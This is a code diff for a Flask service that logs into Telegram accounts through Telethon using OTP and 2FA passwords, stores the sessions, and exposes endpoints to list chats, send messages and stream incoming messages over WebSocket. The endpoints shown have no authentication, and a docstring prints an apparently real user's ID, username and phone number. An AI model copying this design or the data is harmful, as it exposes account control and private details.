@@ -2,7 +2,10 @@
 
 import os
 import asyncio
+import threading
+
 from flask import Flask, request, jsonify, redirect, send_file
+from flask_sock import Sock
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
@@ -37,7 +40,9 @@ db = mongo_client[MONGO_DB]
 # ✅ Flask Init
 app = Flask(__name__)
 
-socketio = SocketIO(app, cors_allowed_origins="*")
+sock = Sock(app)
+connected_clients = set()
+
 
 
 # ✅ Windows fix
@@ -71,6 +76,185 @@ async def get_client(phone: str):
 
 
 
+
+# ==================================
+# 🌐 WEBSOCKET ENDPOINT
+# ==================================
+import json
+import asyncio
+from telethon import events
+
+@sock.route('/ws')
+def ws_route(ws):
+    connected_clients.add(ws)
+    print("🔗 WebSocket connected")
+
+    active_clients = {}  # phone → TelegramClient map
+
+    try:
+        while True:
+            msg = ws.receive()
+            if msg is None:
+                break
+
+            print(f"📩 Received from client: {msg}")
+
+            try:
+                data = json.loads(msg)
+                action = data.get("action")
+
+                # ✅ SEND message to Telegram
+                if action == "send":
+                    phone = data.get("phone")
+                    to = data.get("to")
+                    text = data.get("text")
+
+                    if not all([phone, to, text]):
+                        ws.send(json.dumps({"status": "error", "detail": "phone/to/text missing"}))
+                        continue
+
+                    async def do_send():
+                        client = await get_client(phone)
+                        await client.connect()
+
+                        # 🔹 যদি এখনও authorized না থাকে
+                        if not await client.is_user_authorized():
+                            await client.disconnect()
+                            return {"status": "error", "detail": "not authorized"}
+
+                        # 🔹 Telegram-এ পাঠানো
+                        await client.send_message(to, text)
+                        await save_session(phone, client)
+                        await client.disconnect()
+                        return {"status": "sent", "to": to, "text": text}
+
+                    result = asyncio.run(do_send())
+                    ws.send(json.dumps(result))
+                    print("✅ Sent:", result)
+
+                # ✅ LISTEN / SUBSCRIBE for incoming Telegram messages
+                elif action == "listen":
+                    phone = data.get("phone")
+                    if not phone:
+                        ws.send(json.dumps({"status": "error", "detail": "phone missing"}))
+                        continue
+
+                    async def start_listener():
+                        client = await get_client(phone)
+                        await client.connect()
+
+                        if not await client.is_user_authorized():
+                            await client.disconnect()
+                            ws.send(json.dumps({"status": "error", "detail": "not authorized"}))
+                            return
+
+                        # 🔹 New message handler
+                        @client.on(events.NewMessage)
+                        async def handler(event):
+                            sender = await event.get_sender()
+                            payload = {
+                                "action": "new_message",
+                                "phone": phone,
+                                "chat_id": getattr(event.chat, "id", None),
+                                "text": event.raw_text,
+                                "sender_id": getattr(sender, "id", None),
+                                "sender_name": getattr(sender, "first_name", None),
+                                "date": event.date.isoformat() if event.date else None
+                            }
+                            try:
+                                ws.send(json.dumps(payload))
+                                print(f"📨 Broadcasted Telegram msg → WS: {payload}")
+                            except Exception as e:
+                                print(f"⚠️ WebSocket send failed: {e}")
+
+                        active_clients[phone] = client
+                        ws.send(json.dumps({"status": "listening", "phone": phone}))
+                        print(f"👂 Started listening for {phone}")
+
+                        # 🔄 Keep running listener loop
+                        await client.run_until_disconnected()
+
+                    threading.Thread(target=lambda: asyncio.run(start_listener()), daemon=True).start()
+
+                # ✅ Ping test
+                elif action == "ping":
+                    ws.send(json.dumps({"status": "pong"}))
+
+                else:
+                    ws.send(json.dumps({"status": "error", "detail": "unknown action"}))
+
+            except Exception as e:
+                ws.send(json.dumps({"status": "error", "detail": str(e)}))
+                print(f"⚠️ WS error: {e}")
+
+    except Exception as e:
+        print(f"⚠️ WebSocket loop error: {e}")
+
+    finally:
+        connected_clients.remove(ws)
+        print("❌ WebSocket disconnected")
+
+        # সব Telegram client বন্ধ করা
+        for phone, c in active_clients.items():
+            try:
+                asyncio.run(c.disconnect())
+            except:
+                pass
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# async def add_new_message_listener(phone: str, client: TelegramClient):
+#     """Listen for incoming Telegram messages in real-time"""
+#     @client.on(events.NewMessage)
+#     async def handler(event):
+#         try:
+#             sender = await event.get_sender()
+#             data = {
+#                 "phone": phone,
+#                 "chat_id": getattr(event.chat, "id", None),
+#                 "text": event.raw_text,
+#                 "sender_id": getattr(sender, "id", None),
+#                 "sender_name": getattr(sender, "first_name", None),
+#                 "date": event.date.isoformat() if event.date else None
+#             }
+#             print(f"📩 New message for {phone}: {data}")
+#
+#         except Exception as e:
+#             print(f"⚠️ Error in new_message handler: {e}")
+
+
+
+
+
+
+
+
+
+
+import json
+
 async def add_new_message_listener(phone: str, client: TelegramClient):
     """Listen for incoming Telegram messages in real-time"""
     @client.on(events.NewMessage)
@@ -86,9 +270,20 @@ async def add_new_message_listener(phone: str, client: TelegramClient):
                 "date": event.date.isoformat() if event.date else None
             }
             print(f"📩 New message for {phone}: {data}")
-            socketio.emit("new_message", data)
+
+            # 🔹 Send real-time data to all WebSocket clients
+            for client_ws in list(connected_clients):
+                try:
+                    client_ws.send(json.dumps(data))
+                except Exception as e:
+                    print(f"⚠️ WebSocket send failed: {e}")
+
         except Exception as e:
             print(f"⚠️ Error in new_message handler: {e}")
+
+
+
+
 
 
 
@@ -370,22 +565,98 @@ def login():
 # ==================================
 # 🔑 VERIFY OTP (RAW USER STRING)
 # ==================================
+# @app.route("/verify", methods=["POST"])
+# def verify():
+#     """
+#     Telegram OTP verification endpoint.
+#     Handles:
+#     - Normal OTP login
+#     - Two-step verification (2FA)
+#     - Returns raw Telethon User(...) string exactly like Telegram object repr
+#     Example:
+#         POST /verify
+#         {
+#           "phone": "+8801606xxxxxx",
+#           "code": "12345",
+#           "phone_code_hash": "xxxxxxxx"
+#         }
+#     """
+#     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
+#     code = request.form.get("code") or (request.json.get("code") if request.is_json else None)
+#     phone_code_hash = request.form.get("phone_code_hash") or (
+#         request.json.get("phone_code_hash") if request.is_json else None
+#     )
+#
+#     if not all([phone, code, phone_code_hash]):
+#         return jsonify({"status": "error", "detail": "phone/code/phone_code_hash missing"}), 400
+#
+#     async def do_verify():
+#         client = await get_client(phone)
+#         await client.connect()
+#         try:
+#             # ✅ already authorized
+#             if await client.is_user_authorized():
+#                 me = await client.get_me()
+#                 user_str = str(me)
+#                 await client.disconnect()
+#                 return {"status": "already_authorized", "user": user_str}
+#
+#             # ✅ try OTP sign in
+#             user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+#             if not user:
+#                 await client.disconnect()
+#                 return {"status": "error", "detail": "sign_in returned None (invalid code or hash)"}
+#
+#             await client.send_message("me", "✅ Flask API login successful!")
+#             await save_session(phone, client)
+#
+#             me = await client.get_me()
+#             user_str = str(me)
+#
+#             await client.disconnect()
+#             return {"status": "authorized", "user": user_str}
+#
+#         except SessionPasswordNeededError:
+#             # 🔐 2FA required
+#             await client.disconnect()
+#             return {
+#                 "status": "2fa_required",
+#                 "detail": "Two-step verification password needed for this account"
+#             }
+#
+#         except PhoneCodeInvalidError:
+#             await client.disconnect()
+#             return {"status": "error", "detail": "Invalid OTP code"}
+#
+#         except Exception as e:
+#             import traceback
+#             print("❌ Exception in /verify:\n", traceback.format_exc())
+#             await client.disconnect()
+#             return {"status": "error", "detail": str(e)}
+#
+#     result = asyncio.run(do_verify())
+#     print("✅ Verify result:", result)
+#     return jsonify(result)
+
+
+
+
+
+
+
+
+import base64
+import json
+
 @app.route("/verify", methods=["POST"])
 def verify():
     """
-    Telegram OTP verification endpoint.
-    Handles:
-    - Normal OTP login
-    - Two-step verification (2FA)
-    - Returns raw Telethon User(...) string exactly like Telegram object repr
-    Example:
-        POST /verify
-        {
-          "phone": "+8801606xxxxxx",
-          "code": "12345",
-          "phone_code_hash": "xxxxxxxx"
-        }
+    Telegram OTP verification endpoint (Full JSON + Safe for bytes + type rename)
+    - সব user ফিল্ড ফেরত দেয়
+    - bytes গুলো base64 এ কনভার্ট করে
+    - "_" key কে "type" এ rename করে
     """
+
     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
     code = request.form.get("code") or (request.json.get("code") if request.is_json else None)
     phone_code_hash = request.form.get("phone_code_hash") or (
@@ -395,6 +666,23 @@ def verify():
     if not all([phone, code, phone_code_hash]):
         return jsonify({"status": "error", "detail": "phone/code/phone_code_hash missing"}), 400
 
+    # 🔹 Recursive helper: makes all data JSON-safe and renames "_" → "type"
+    def make_json_safe(obj):
+        if isinstance(obj, dict):
+            new_dict = {}
+            for k, v in obj.items():
+                key = "type" if k == "_" else k
+                new_dict[key] = make_json_safe(v)
+            return new_dict
+        elif isinstance(obj, list):
+            return [make_json_safe(v) for v in obj]
+        elif isinstance(obj, bytes):
+            return base64.b64encode(obj).decode("utf-8")
+        elif isinstance(obj, datetime):
+            return obj.isoformat()
+        else:
+            return obj
+
     async def do_verify():
         client = await get_client(phone)
         await client.connect()
@@ -402,9 +690,9 @@ def verify():
             # ✅ already authorized
             if await client.is_user_authorized():
                 me = await client.get_me()
-                user_str = str(me)
+                user_data = make_json_safe(me.to_dict())
                 await client.disconnect()
-                return {"status": "already_authorized", "user": user_str}
+                return {"status": "already_authorized", "user": user_data}
 
             # ✅ try OTP sign in
             user = await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
@@ -416,13 +704,12 @@ def verify():
             await save_session(phone, client)
 
             me = await client.get_me()
-            user_str = str(me)
-
+            user_data = make_json_safe(me.to_dict())
             await client.disconnect()
-            return {"status": "authorized", "user": user_str}
+
+            return {"status": "authorized", "user": user_data}
 
         except SessionPasswordNeededError:
-            # 🔐 2FA required
             await client.disconnect()
             return {
                 "status": "2fa_required",
@@ -452,56 +739,16 @@ def verify():
 
 
 
-# ==================================
-# 🔐 VERIFY 2FA PASSWORD
-# ==================================
-# @app.route("/verify_password", methods=["POST"])
-# def verify_password():
-#     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
-#     password = request.form.get("password") or (request.json.get("password") if request.is_json else None)
-#     if not all([phone, password]):
-#         return jsonify({"status": "error", "detail": "phone/password missing"}), 400
-#
-#     async def do_verify_password():
-#         client = await get_client(phone)
-#         await client.connect()
-#         try:
-#             if await client.is_user_authorized():
-#                 await client.disconnect()
-#                 return {"status": "already_authorized"}
-#
-#             await client.sign_in(password=password)
-#             await client.send_message("me", "✅ 2FA password verified successfully!")
-#             await save_session(phone, client)
-#             await client.disconnect()
-#             return {"status": "authorized_by_password"}
-#         except Exception as e:
-#             await client.disconnect()
-#             return {"status": "error", "detail": str(e)}
-#
-#     result = asyncio.run(do_verify_password())
-#     print("✅ Verify password result:", result)
-#     return jsonify(result)
 
 
 
 
 
 
-
-
-
-
-
-
-# ==================================
-# 🔐 VERIFY 2FA PASSWORD (FULL USER INFO)
-# ==================================
 # @app.route("/verify_password", methods=["POST"])
 # def verify_password():
 #     """
-#     Verify Telegram 2-Step Verification password.
-#     Returns full user info if successful.
+#     Verify Telegram 2FA password and return the raw Telethon User(...) string.
 #     """
 #     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
 #     password = request.form.get("password") or (request.json.get("password") if request.is_json else None)
@@ -512,28 +759,28 @@ def verify():
 #         client = await get_client(phone)
 #         await client.connect()
 #         try:
-#             # যদি আগে থেকেই লগইন করা থাকে
+#             # 🔹 Already authorized
 #             if await client.is_user_authorized():
 #                 me = await client.get_me()
+#                 user_str = str(me)
 #                 await client.disconnect()
 #                 return {
 #                     "status": "already_authorized",
-#                     "user": str(me)
+#                     "user": user_str
 #                 }
 #
-#             # 🔐 password দিয়ে sign in
+#             # 🔹 Sign in with password
 #             await client.sign_in(password=password)
-#
 #             await client.send_message("me", "✅ 2FA password verified successfully!")
 #             await save_session(phone, client)
 #
-#             # ✅ full user info
 #             me = await client.get_me()
-#             await client.disconnect()
+#             user_str = str(me)
 #
+#             await client.disconnect()
 #             return {
 #                 "status": "authorized_by_password",
-#                 "user": str(me)
+#                 "user": user_str
 #             }
 #
 #         except Exception as e:
@@ -552,30 +799,61 @@ def verify():
 
 
 
+import base64
+import json
+from datetime import datetime
 
-
-
-
-
-
-
-
-
-
-
-
-# ==================================
-# 🔐 VERIFY 2FA PASSWORD (RAW USER STRING)
-# ==================================
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
     """
-    Verify Telegram 2FA password and return the raw Telethon User(...) string.
+    Verify Telegram 2FA password and return full user data (JSON safe)
+    - Converts all bytes → base64
+    - Renames "_" → "type"
+    - Returns all user fields
+    Example Response:
+        {
+          "status": "authorized_by_password",
+          "user": {
+            "type": "User",
+            "id": 7216261663,
+            "first_name": "小美",
+            "username": "HZ166688",
+            "phone": "8801731979364",
+            "photo": {
+              "type": "UserProfilePhoto",
+              "photo_id": "6244245629744302038",
+              "dc_id": 5,
+              "stripped_thumb": "AQgIjVd3leckcH+YooorPw=="
+            },
+            "status": {
+              "type": "UserStatusOnline",
+              "expires": "2025-10-13T12:29:01+00:00"
+            }
+          }
+        }
     """
+
     phone = request.form.get("phone") or (request.json.get("phone") if request.is_json else None)
     password = request.form.get("password") or (request.json.get("password") if request.is_json else None)
     if not all([phone, password]):
         return jsonify({"status": "error", "detail": "phone/password missing"}), 400
+
+    # 🔹 Helper: Convert any structure safely into JSON (bytes→base64, "_"→type)
+    def make_json_safe(obj):
+        if isinstance(obj, dict):
+            new_dict = {}
+            for k, v in obj.items():
+                key = "type" if k == "_" else k
+                new_dict[key] = make_json_safe(v)
+            return new_dict
+        elif isinstance(obj, list):
+            return [make_json_safe(v) for v in obj]
+        elif isinstance(obj, bytes):
+            return base64.b64encode(obj).decode("utf-8")
+        elif isinstance(obj, datetime):
+            return obj.isoformat()
+        else:
+            return obj
 
     async def do_verify_password():
         client = await get_client(phone)
@@ -584,26 +862,20 @@ def verify_password():
             # 🔹 Already authorized
             if await client.is_user_authorized():
                 me = await client.get_me()
-                user_str = str(me)
+                user_data = make_json_safe(me.to_dict())
                 await client.disconnect()
-                return {
-                    "status": "already_authorized",
-                    "user": user_str
-                }
+                return {"status": "already_authorized", "user": user_data}
 
-            # 🔹 Sign in with password
+            # 🔹 Sign in with password (2FA)
             await client.sign_in(password=password)
             await client.send_message("me", "✅ 2FA password verified successfully!")
             await save_session(phone, client)
 
             me = await client.get_me()
-            user_str = str(me)
+            user_data = make_json_safe(me.to_dict())
 
             await client.disconnect()
-            return {
-                "status": "authorized_by_password",
-                "user": user_str
-            }
+            return {"status": "authorized_by_password", "user": user_data}
 
         except Exception as e:
             import traceback
@@ -614,8 +886,6 @@ def verify_password():
     result = asyncio.run(do_verify_password())
     print("✅ Verify password result:", result)
     return jsonify(result)
-
-
 
 
 
@@ -648,216 +918,118 @@ def user_to_dict(user):
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# ==================================
-# 💬 GET DIALOGS (Optimized + Lazy Load Ready)
-# ==================================
 @app.route("/dialogs", methods=["GET"])
 def get_dialogs():
     """
     Telegram থেকে সমস্ত dialogs (chats, groups, channels)
-    দ্রুত ও lazy-load ready format-এ ফেরত দেয়।
+    পুরো detailed structured JSON format এ ফেরত দেয়।
     Example:
-      /dialogs?phone=+8801606100833
+      /dialogs?phone=+8801731979364
     """
     phone = request.args.get("phone")
     if not phone:
         return jsonify({"status": "error", "detail": "phone missing"}), 400
 
     async def do_get_dialogs():
-        # 🧠 Cached client load
-        client = await get_client(phone)
-        if not client.is_connected():
-            await client.connect()
+        from telethon.tl.functions.channels import GetFullChannelRequest
+        from telethon.tl.functions.messages import GetFullChatRequest
 
-        # ✅ Authorized check
-        if not await client.is_user_authorized():
+        try:
+            client = await get_client(phone)
+            if not client.is_connected():
+                await client.connect()
+
+            # ✅ authorized কিনা check
+            if not await client.is_user_authorized():
+                await client.disconnect()
+                return {"status": "error", "detail": "not authorized"}
+
+            dialogs = []
+
+            async for d in client.iter_dialogs(limit=50):
+                e = d.entity
+                msg = d.message
+
+                # 🔹 Last message info
+                last_msg = {
+                    "id": getattr(msg, "id", None),
+                    "text": getattr(msg, "message", None),
+                    "date": getattr(msg, "date", None).isoformat() if getattr(msg, "date", None) else None,
+                    "sender_id": getattr(getattr(msg, "from_id", None), "user_id", None),
+                    "reply_to": getattr(getattr(msg, "reply_to", None), "reply_to_msg_id", None),
+                    "media": str(type(getattr(msg, "media", None)).__name__) if getattr(msg, "media", None) else None,
+                } if msg else None
+
+                # 🔹 Channel/Group participant count
+                participants_count = None
+                about = None
+                dc_id = getattr(getattr(e, "photo", None), "dc_id", None)
+
+                try:
+                    if d.is_channel:
+                        full = await client(GetFullChannelRequest(e))
+                        participants_count = getattr(full.full_chat, "participants_count", None)
+                        about = getattr(full.full_chat, "about", None)
+                    elif d.is_group:
+                        full = await client(GetFullChatRequest(e.id))
+                        participants_count = getattr(full.full_chat, "participants_count", None)
+                        about = getattr(full.full_chat, "about", None)
+                except Exception:
+                    pass
+
+                # 🔹 Build dialog info
+                dialog_info = {
+                    "id": getattr(e, "id", None),
+                    "name": getattr(e, "title", getattr(e, "username", str(e))),
+                    "title": getattr(e, "title", None),
+                    "first_name": getattr(e, "first_name", None),
+                    "last_name": getattr(e, "last_name", None),
+                    "username": getattr(e, "username", None),
+                    "phone": getattr(e, "phone", None),
+                    "about": about,
+                    "access_hash": getattr(e, "access_hash", None),
+                    "dc_id": dc_id,
+                    "is_user": d.is_user,
+                    "is_group": d.is_group,
+                    "is_channel": d.is_channel,
+                    "unread_count": d.unread_count,
+                    "pinned": getattr(d, "pinned", False),
+                    "verified": getattr(e, "verified", False),
+                    "restricted": getattr(e, "restricted", False),
+                    "bot": getattr(e, "bot", False),
+                    "fake": getattr(e, "fake", False),
+                    "scam": getattr(e, "scam", False),
+                    "premium": getattr(e, "premium", False),
+                    "participants_count": participants_count,
+                    "has_photo": bool(getattr(e, "photo", None)),
+                    "last_message": last_msg,
+                }
+
+                dialogs.append(dialog_info)
+
             await client.disconnect()
-            return {"status": "error", "detail": "not authorized"}
-
-        dialogs = []
-
-        # ⚙️ Limit কমানো হয়েছে (speed boost)
-        async for d in client.iter_dialogs(limit=50):
-            e = d.entity
-
-            # 🖼️ Future-ready lazy load (photo download এখন বন্ধ)
-            # ⚡ ভবিষ্যতে চাইলে নিচের তিনটা লাইন uncomment করে দিও
-            photo = None
-            # try:
-            #     if e.photo:
-            #         photo = await client.download_profile_photo(e, file=bytes)
-            # except Exception:
-            #     pass
-
-            # 🧩 Last message info
-            msg = d.message
-            last_msg = {
-                "id": getattr(msg, "id", None),
-                "text": getattr(msg, "message", None),
-                "date": getattr(msg, "date", None).isoformat() if getattr(msg, "date", None) else None,
-                "sender_id": getattr(getattr(msg, "from_id", None), "user_id", None),
-                "reply_to": getattr(getattr(msg, "reply_to", None), "reply_to_msg_id", None),
-                "media": str(type(getattr(msg, "media", None)).__name__) if getattr(msg, "media", None) else None,
-            } if msg else None
-
-            # 📦 Dialog summary data
-            dialog_info = {
-                # 🆔 Basic
-                "id": d.id,
-                "name": getattr(e, "title", getattr(e, "username", str(e))),
-                "username": getattr(e, "username", None),
-                "first_name": getattr(e, "first_name", None),
-                "last_name": getattr(e, "last_name", None),
-                "phone": getattr(e, "phone", None),
-
-                # 🔍 Type
-                "is_user": d.is_user,
-                "is_group": d.is_group,
-                "is_channel": d.is_channel,
-
-                # 🕐 Meta
-                "unread_count": d.unread_count,
-                "pinned": getattr(d, "pinned", False),
-
-                # ⚡ Optional flags
-                "verified": getattr(e, "verified", False),
-                "bot": getattr(e, "bot", False),
-                "premium": getattr(e, "premium", False),
-                "fake": getattr(e, "fake", False),
-                "scam": getattr(e, "scam", False),
-
-                # 💬 Last message info
-                "last_message": last_msg,
-
-                # 🖼️ Lazy photo indicator
-                "has_photo": bool(getattr(e, "photo", None)),
+            return {
+                "status": "ok",
+                "count": len(dialogs),
+                "dialogs": dialogs
             }
 
-            dialogs.append(dialog_info)
+        except Exception as e:
+            import traceback
+            print("❌ Exception in /dialogs:\n", traceback.format_exc())
+            return {"status": "error", "detail": str(e)}
 
-        # ✅ Disconnect কোরো না যদি client cache ব্যবহার করো
-        # await client.disconnect()
-
-        return {"status": "ok", "count": len(dialogs), "dialogs": dialogs}
-
-    # 🚀 Run async task
     result = asyncio.run(do_get_dialogs())
-    print(f"✅ Dialogs result: {result['count']} chats fetched")
+
+    # ✅ Safe print (no KeyError possible)
+    if result.get("status") == "ok":
+        print(f"✅ Dialogs fetched successfully: {result.get('count', 0)} items.")
+    else:
+        print(f"⚠️ Dialog fetch error: {result.get('detail', 'unknown error')}")
+
     return jsonify(result)
 
 
-
-
-
-
-
-
-
-#
-# @app.route("/dialogs", methods=["GET"])
-# def get_dialogs():
-#     """
-#     Telegram থেকে সমস্ত dialogs (chats, groups, channels)
-#     full detailed info সহ ফেরত দেয়।
-#     Example:
-#       /dialogs?phone=+8801606100833
-#     """
-#     phone = request.args.get("phone")
-#     if not phone:
-#         return jsonify({"status": "error", "detail": "phone missing"}), 400
-#
-#     async def do_get_dialogs():
-#         client = await get_client(phone)
-#         await client.connect()
-#
-#         if not await client.is_user_authorized():
-#             await client.disconnect()
-#             return {"status": "error", "detail": "not authorized"}
-#
-#         dialogs = []
-#         async for d in client.iter_dialogs(limit=100):  # চাইলে limit বাড়াতে পারো
-#             e = d.entity
-#
-#             # 🧩 Try to get profile photo URL (optional)
-#             photo = None
-#             try:
-#                 if e.photo:
-#                     photo = await client.download_profile_photo(e, file=bytes)
-#             except Exception:
-#                 pass
-#
-#             # 🧩 Last message info
-#             msg = d.message
-#             last_msg = {
-#                 "id": getattr(msg, "id", None),
-#                 "text": getattr(msg, "message", None),
-#                 "date": getattr(msg, "date", None).isoformat() if getattr(msg, "date", None) else None,
-#                 "sender_id": getattr(getattr(msg, "from_id", None), "user_id", None),
-#                 "reply_to": getattr(getattr(msg, "reply_to", None), "reply_to_msg_id", None),
-#                 "media": str(type(getattr(msg, "media", None)).__name__) if getattr(msg, "media", None) else None,
-#             } if msg else None
-#
-#             dialog_info = {
-#                 # 🆔 Basic identifiers
-#                 "id": d.id,
-#                 "name": getattr(e, "title", getattr(e, "username", str(e))),
-#                 "username": getattr(e, "username", None),
-#                 "first_name": getattr(e, "first_name", None),
-#                 "last_name": getattr(e, "last_name", None),
-#                 "phone": getattr(e, "phone", None),
-#
-#                 # 🔍 Chat Type
-#                 "is_user": d.is_user,
-#                 "is_group": d.is_group,
-#                 "is_channel": d.is_channel,
-#
-#                 # 🕐 Message + Meta
-#                 "unread_count": d.unread_count,
-#                 "pinned": getattr(d, "pinned", False),
-#                 "verified": getattr(e, "verified", False),
-#                 "restricted": getattr(e, "restricted", False),
-#                 "bot": getattr(e, "bot", False),
-#                 "scam": getattr(e, "scam", False),
-#                 "fake": getattr(e, "fake", False),
-#                 "premium": getattr(e, "premium", False),
-#
-#                 # 🧠 Extended fields
-#                 "title": getattr(e, "title", None),
-#                 "about": getattr(e, "about", None),
-#                 "participants_count": getattr(e, "participants_count", None),
-#                 "access_hash": getattr(e, "access_hash", None),
-#                 "dc_id": getattr(getattr(e, "photo", None), "dc_id", None),
-#
-#                 # 💬 Last Message Info
-#                 "last_message": last_msg,
-#
-#                 # 🖼️ Optional: photo bytes base64
-#                 "has_photo": bool(photo),
-#             }
-#
-#             dialogs.append(dialog_info)
-#
-#         await client.disconnect()
-#         return {"status": "ok", "count": len(dialogs), "dialogs": dialogs}
-#
-#     result = asyncio.run(do_get_dialogs())
-#     print(f"✅ Dialogs result: {result['count']} chats fetched")
-#     return jsonify(result)
 
 
 
@@ -958,20 +1130,6 @@ def send_message():
     result = asyncio.run(do_send())
     print("✅ Send result:", result)
     return jsonify(result)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
